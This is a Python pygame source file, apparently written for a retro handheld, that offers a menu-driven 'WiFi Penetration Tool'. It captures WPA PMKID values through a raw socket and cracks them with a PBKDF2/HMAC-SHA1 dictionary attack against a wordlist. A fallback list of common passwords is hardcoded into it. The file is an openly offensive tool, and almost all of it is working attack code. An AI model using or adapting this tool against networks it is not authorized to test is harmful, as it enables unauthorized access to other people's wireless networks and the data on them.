#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WiFi Penetration Tool - MuOS / RG353
Unified GUI for PMKID capture and cracking.
Integrates capture_pmkid.py and crack_pmkid.py into one pygame app.
"""

import pygame
import socket
import sys
import os
import hashlib
import hmac
import struct
import threading
import time
import signal
from datetime import datetime

# ------------------------------------------------------------
# CONSTANTS
# ------------------------------------------------------------
WIDTH, HEIGHT = 640, 480
BG_COLOR = (15, 15, 18)
TEXT_COLOR = (200, 200, 210)
ACCENT_COLOR = (255, 90, 30)
SELECTED_BG = (40, 40, 50)
BOX_BG = (25, 25, 32)
GREEN = (100, 220, 100)
RED = (255, 100, 100)
YELLOW = (255, 220, 80)

INTERFACE = "wlan0"          # default, may be overridden
TIMEOUT = 60                 # seconds for capture
PASSLIST_FILE = "passlist.txt"  # relative to script dir

# ------------------------------------------------------------
# PYGAME INIT
# ------------------------------------------------------------
pygame.init()
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("WiFi Penetration Tool")
font_title = pygame.font.Font(None, 36)
font_normal = pygame.font.Font(None, 28)
font_small = pygame.font.Font(None, 20)
font_tiny = pygame.font.Font(None, 16)

clock = pygame.time.Clock()

# ------------------------------------------------------------
# HELPER FUNCTIONS
# ------------------------------------------------------------
def script_dir():
    """Return the directory where this script resides."""
    return os.path.dirname(os.path.abspath(__file__))

def load_wordlist():
    """Load password list from file or fallback to built-in list."""
    path = os.path.join(script_dir(), PASSLIST_FILE)
    try:
        with open(path, 'r') as f:
            words = [line.strip() for line in f if line.strip()]
        return words
    except Exception:
        # Fallback wordlist (small set)
        return [
            "123456", "password", "12345678", "qwerty", "123456789",
            "12345", "1234", "111111", "dragon", "123123", "baseball",
            "abc123", "football", "monkey", "letmein", "696969",
            "shadow", "master", "666666", "qwertyuiop", "123321",
            "mustang", "1234567890", "michael", "654321", "pussy",
            "superman", "1qaz2wsx", "7777777", "fuckyou", "121212",
            "000000", "qazwsx", "123qwe", "killer", "trustno1",
            "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter",
            "buster", "soccer", "harley", "batman", "andrew",
            "tigger", "hashcat!", "sunshine", "iloveyou", "fuckme"
        ]

def get_ssid_from_config():
    """Extract SSID from muOS config file."""
    cfg_path = "/storage/.config/system/configs/system.cfg"
    try:
        with open(cfg_path, 'r') as f:
            for line in f:
                if line.startswith("wifi.ssid="):
                    return line.split("=", 1)[1].strip()
    except:
        pass
    return None

def format_mac(mac_bytes):
    return ":".join(f"{b:02x}" for b in mac_bytes)

# ------------------------------------------------------------
# WORKER THREADS
# ------------------------------------------------------------
class CaptureWorker(threading.Thread):
    def __init__(self, interface, essid, timeout=60):
        super().__init__()
        self.interface = interface
        self.essid = essid
        self.timeout = timeout
        self.running = True
        self.finished = False
        self.error = None
        self.result = None  # dict with pmkid, mac_ap, mac_cl, hashline
        self.status = "Initializing..."
        self.frame_count = 0

    def run(self):
        self.status = "Opening raw socket..."
        try:
            rawSocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            rawSocket.bind((self.interface, 0x0003))
            rawSocket.settimeout(self.timeout)
        except Exception as e:
            self.error = f"Socket error: {e}"
            self.finished = True
            return

        self.status = "Listening for EAPoL frames..."
        first_eapol = None
        pmkid = None
        mac_ap = None
        mac_cl = None
        self.frame_count = 0
        start_time = time.time()

        try:
            while self.running and not self.finished:
                try:
                    packet = rawSocket.recvfrom(2048)[0]
                    # Try offset 2 (common for many routers)
                    # If needed, we can try other offsets, but keep it simple.
                    offset = 2
                    if len(packet) < offset + 16:
                        continue
                    eapol = packet[offset:]
                    self.frame_count += 1
                    self.status = f"Frame #{self.frame_count} received"

                    if self.frame_count == 1:
                        first_eapol = eapol
                        pmkid = eapol[-16:].hex()
                        mac_ap = eapol[4:10]
                    elif self.frame_count == 2:
                        mac_cl = eapol[4:10]
                        # We have everything
                        hashline = f"WPA*01*{pmkid}*{mac_ap.hex()}*{mac_cl.hex()}*{self.essid.encode('utf-8').hex()}***"
                        self.result = {
                            "pmkid": pmkid,
                            "mac_ap": mac_ap,
                            "mac_cl": mac_cl,
                            "essid": self.essid,
                            "hashline": hashline
                        }
                        self.status = "Capture complete!"
                        self.finished = True
                        rawSocket.close()
                        return
                except socket.timeout:
                    self.error = f"Timeout: no EAPoL frames received in {self.timeout}s"
                    self.finished = True
                    rawSocket.close()
                    return
                except Exception as e:
                    if self.running:
                        self.error = f"Error: {e}"
                        self.finished = True
                        rawSocket.close()
                        return
        except Exception as e:
            self.error = str(e)
            self.finished = True
            rawSocket.close()
            return

    def stop(self):
        self.running = False

class CrackWorker(threading.Thread):
    def __init__(self, hashline, wordlist):
        super().__init__()
        self.hashline = hashline
        self.wordlist = wordlist
        self.running = True
        self.finished = False
        self.found = False
        self.password = None
        self.status = "Ready"
        self.progress = 0
        self.total = len(wordlist)
        self.last_try = ""
        self.error = None

    def run(self):
        try:
            parts = self.hashline.split('*')
            if len(parts) < 6:
                self.error = "Invalid hashline format"
                self.finished = True
                return
            pmkid = parts[2]
            mac_ap = bytes.fromhex(parts[3])
            mac_cl = bytes.fromhex(parts[4])
            essid = bytes.fromhex(parts[5])

            self.status = "Cracking started..."
            self.progress = 0
            for idx, pwd in enumerate(self.wordlist):
                if not self.running:
                    break
                self.last_try = pwd
                self.progress = idx + 1
                self.status = f"Trying {pwd} ({idx+1}/{self.total})"

                pmk = hashlib.pbkdf2_hmac('sha1', pwd.encode(), essid, 4096, 32)
                try_pmkid = hmac.digest(pmk, b"PMK Name" + mac_ap + mac_cl, hashlib.sha1).hex()[0:32]

                if try_pmkid == pmkid:
                    self.found = True
                    self.password = pwd
                    self.status = "PASSWORD FOUND!"
                    self.finished = True
                    return

                time.sleep(0.001)  # small delay to prevent CPU hog

            self.status = "Cracking finished - no match"
            self.finished = True
        except Exception as e:
            self.error = str(e)
            self.finished = True

    def stop(self):
        self.running = False

# ------------------------------------------------------------
# APP CLASS
# ------------------------------------------------------------
class App:
    def __init__(self):
        self.running = True
        self.state = "menu"          # menu, capture, crack, results
        self.selected = 0
        self.menu_items = ["Capture PMKID", "Crack PMKID", "Exit"]

        # Capture state
        self.capture_worker = None
        self.capture_result = None
        self.capture_error = None
        self.capture_finished = False

        # Crack state
        self.crack_worker = None
        self.crack_result = None  # password or None
        self.crack_error = None
        self.crack_finished = False
        self.last_try = ""
        self.progress = 0
        self.total = 0
        self.crack_hashline = None

        # shared
        self.essid = get_ssid_from_config() or "MyWiFi"
        self.wordlist = load_wordlist()

    def render_menu(self):
        screen.fill(BG_COLOR)
        # title
        title = font_title.render(">>> WIFI PENETRATION TOOL <<<", True, ACCENT_COLOR)
        screen.blit(title, (WIDTH//2 - title.get_width()//2, 40))

        # menu boxes
        for i, item in enumerate(self.menu_items):
            y = 130 + i * 90
            rect = pygame.Rect(80, y, WIDTH - 160, 65)
            color = SELECTED_BG if i == self.selected else BOX_BG
            border = ACCENT_COLOR if i == self.selected else (60,60,75)
            pygame.draw.rect(screen, color, rect, border_radius=6)
            pygame.draw.rect(screen, border, rect, 2, border_radius=6)
            text_color = ACCENT_COLOR if i == self.selected else TEXT_COLOR
            text = font_normal.render(item, True, text_color)
            screen.blit(text, (rect.x + 20, rect.y + 18))

        # footer
        footer = font_small.render("[UP/DOWN] Navigate  [ENTER] Select  [ESC] Back/Exit", True, (120,120,140))
        screen.blit(footer, (WIDTH//2 - footer.get_width()//2, HEIGHT - 40))
        pygame.display.flip()

    def render_capture(self):
        screen.fill(BG_COLOR)
        # header
        header = font_title.render("CAPTURE PMKID", True, ACCENT_COLOR)
        screen.blit(header, (20, 20))
        # SSID
        ssid_text = font_small.render(f"SSID: {self.essid}", True, TEXT_COLOR)
        screen.blit(ssid_text, (20, 70))

        if self.capture_error:
            err = font_normal.render(f"ERROR: {self.capture_error}", True, RED)
            screen.blit(err, (20, 120))
            back = font_small.render("Press ESC to return", True, (150,150,150))
            screen.blit(back, (20, 400))
            pygame.display.flip()
            return

        if not self.capture_finished and self.capture_worker:
            # show status
            status = font_normal.render(f"Status: {self.capture_worker.status}", True, YELLOW)
            screen.blit(status, (20, 120))
            frames = font_small.render(f"Frames captured: {self.capture_worker.frame_count}", True, TEXT_COLOR)
            screen.blit(frames, (20, 160))
            # show spinner
            spinner = font_small.render("Listening... (timeout 60s)", True, (150,150,150))
            screen.blit(spinner, (20, 200))
        elif self.capture_finished and self.capture_result:
            # success
            res = self.capture_result
            screen.blit(font_normal.render("PMKID CAPTURED!", True, GREEN), (20, 120))
            screen.blit(font_small.render(f"PMKID: {res['pmkid']}", True, TEXT_COLOR), (20, 160))
            screen.blit(font_small.render(f"MAC AP: {format_mac(res['mac_ap'])}", True, TEXT_COLOR), (20, 190))
            screen.blit(font_small.render(f"MAC Client: {format_mac(res['mac_cl'])}", True, TEXT_COLOR), (20, 220))
            # show hashline
            hline = res['hashline']
            # split long line for display
            chunks = [hline[i:i+60] for i in range(0, len(hline), 60)]
            for idx, chunk in enumerate(chunks):
                line = font_tiny.render(chunk, True, (200,200,100))
                screen.blit(line, (20, 260 + idx*18))
            # save to file
            save_path = os.path.join(script_dir(), "hashline.txt")
            with open(save_path, 'w') as f:
                f.write(hline)
            saved = font_small.render(f"Saved to {save_path}", True, GREEN)
            screen.blit(saved, (20, 260 + len(chunks)*18 + 10))
            # back instruction
            back = font_small.render("Press ESC to return to menu", True, (150,150,150))
            screen.blit(back, (20, 400))
        elif self.capture_finished and self.capture_worker:
            # finished but no result? maybe timeout or error
            if self.capture_worker.error:
                err = font_normal.render(f"ERROR: {self.capture_worker.error}", True, RED)
                screen.blit(err, (20, 120))
            else:
                screen.blit(font_normal.render("Capture ended without result.", True, YELLOW), (20, 120))
            back = font_small.render("Press ESC to return", True, (150,150,150))
            screen.blit(back, (20, 400))

        pygame.display.flip()

    def render_crack(self):
        screen.fill(BG_COLOR)
        header = font_title.render("CRACK PMKID", True, ACCENT_COLOR)
        screen.blit(header, (20, 20))

        if self.crack_error:
            err = font_normal.render(f"ERROR: {self.crack_error}", True, RED)
            screen.blit(err, (20, 80))
            back = font_small.render("Press ESC to return", True, (150,150,150))
            screen.blit(back, (20, 400))
            pygame.display.flip()
            return

        if not self.crack_finished and self.crack_worker:
            # progress
            total = self.crack_worker.total
            done = self.crack_worker.progress
            pct = (done / total * 100) if total else 0
            screen.blit(font_normal.render(f"Progress: {done}/{total} ({pct:.1f}%)", True, YELLOW), (20, 80))
            screen.blit(font_small.render(f"Trying: {self.crack_worker.last_try}", True, TEXT_COLOR), (20, 120))
            # draw progress bar
            bar_x, bar_y, bar_w, bar_h = 20, 160, 400, 25
            pygame.draw.rect(screen, (50,50,50), (bar_x, bar_y, bar_w, bar_h))
            fill = int(bar_w * pct / 100)
            pygame.draw.rect(screen, ACCENT_COLOR, (bar_x, bar_y, fill, bar_h))
            screen.blit(font_small.render(self.crack_worker.status, True, (150,150,150)), (20, 200))
        elif self.crack_finished:
            if self.crack_result:
                screen.blit(font_normal.render("PASSWORD FOUND!", True, GREEN), (20, 80))
                screen.blit(font_normal.render(f"Password: {self.crack_result}", True, TEXT_COLOR), (20, 120))
            else:
                screen.blit(font_normal.render("Password not found in wordlist.", True, RED), (20, 80))
            back = font_small.render("Press ESC to return", True, (150,150,150))
            screen.blit(back, (20, 400))
        else:
            screen.blit(font_small.render("No cracking in progress.", True, (150,150,150)), (20, 80))

        # show current hashline if available
        if self.crack_hashline:
            hline = self.crack_hashline
            screen.blit(font_tiny.render("Hashline (from hashline.txt):", True, (150,150,150)), (20, 250))
            for i in range(0, len(hline), 60):
                chunk = hline[i:i+60]
                screen.blit(font_tiny.render(chunk, True, (200,200,100)), (20, 270 + (i//60)*18))

        pygame.display.flip()

    def render(self):
        if self.state == "menu":
            self.render_menu()
        elif self.state == "capture":
            self.render_capture()
        elif self.state == "crack":
            self.render_crack()

    def handle_events(self):
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                self.running = False
            elif event.type == pygame.KEYDOWN:
                if self.state == "menu":
                    if event.key == pygame.K_UP or event.key == pygame.K_k:
                        self.selected = (self.selected - 1) % len(self.menu_items)
                    elif event.key == pygame.K_DOWN or event.key == pygame.K_j:
                        self.selected = (self.selected + 1) % len(self.menu_items)
                    elif event.key == pygame.K_RETURN or event.key == pygame.K_SPACE:
                        if self.selected == 0:
                            self.start_capture()
                        elif self.selected == 1:
                            self.start_crack()
                        elif self.selected == 2:
                            self.running = False
                    elif event.key == pygame.K_ESCAPE:
                        self.running = False
                elif self.state == "capture":
                    if event.key == pygame.K_ESCAPE:
                        self.stop_capture()
                        self.state = "menu"
                elif self.state == "crack":
                    if event.key == pygame.K_ESCAPE:
                        self.stop_crack()
                        self.state = "menu"

    def start_capture(self):
        self.state = "capture"
        self.capture_finished = False
        self.capture_result = None
        self.capture_error = None
        self.capture_worker = CaptureWorker(INTERFACE, self.essid, TIMEOUT)
        self.capture_worker.daemon = True
        self.capture_worker.start()
        # we'll check in update loop

    def update_capture(self):
        if self.capture_worker is None:
            return
        if self.capture_worker.finished:
            if self.capture_worker.error:
                self.capture_error = self.capture_worker.error
            elif self.capture_worker.result:
                self.capture_result = self.capture_worker.result
            self.capture_finished = True

    def stop_capture(self):
        if self.capture_worker and self.capture_worker.is_alive():
            self.capture_worker.stop()
            self.capture_worker.join(0.5)

    def start_crack(self):
        hashline_path = os.path.join(script_dir(), "hashline.txt")
        try:
            with open(hashline_path, 'r') as f:
                self.crack_hashline = f.read().strip()
        except:
            self.crack_error = "hashline.txt not found. Capture a PMKID first."
            self.state = "crack"
            return

        if not self.crack_hashline:
            self.crack_error = "hashline.txt is empty."
            self.state = "crack"
            return

        self.state = "crack"
        self.crack_finished = False
        self.crack_result = None
        self.crack_error = None
        self.crack_worker = CrackWorker(self.crack_hashline, self.wordlist)
        self.crack_worker.daemon = True
        self.crack_worker.start()

    def update_crack(self):
        if self.crack_worker is None:
            return
        if self.crack_worker.finished:
            if self.crack_worker.error:
                self.crack_error = self.crack_worker.error
            elif self.crack_worker.found:
                self.crack_result = self.crack_worker.password
            else:
                self.crack_result = None
            self.crack_finished = True

    def stop_crack(self):
        if self.crack_worker and self.crack_worker.is_alive():
            self.crack_worker.stop()
            self.crack_worker.join(0.5)

    def run(self):
        while self.running:
            self.handle_events()
            if self.state == "capture":
                self.update_capture()
            elif self.state == "crack":
                self.update_crack()
            self.render()
            clock.tick(30)

        # cleanup
        self.stop_capture()
        self.stop_crack()
        pygame.quit()
        sys.exit()

# ------------------------------------------------------------
# MAIN
# ------------------------------------------------------------
if __name__ == "__main__":
    app = App()
    app.run()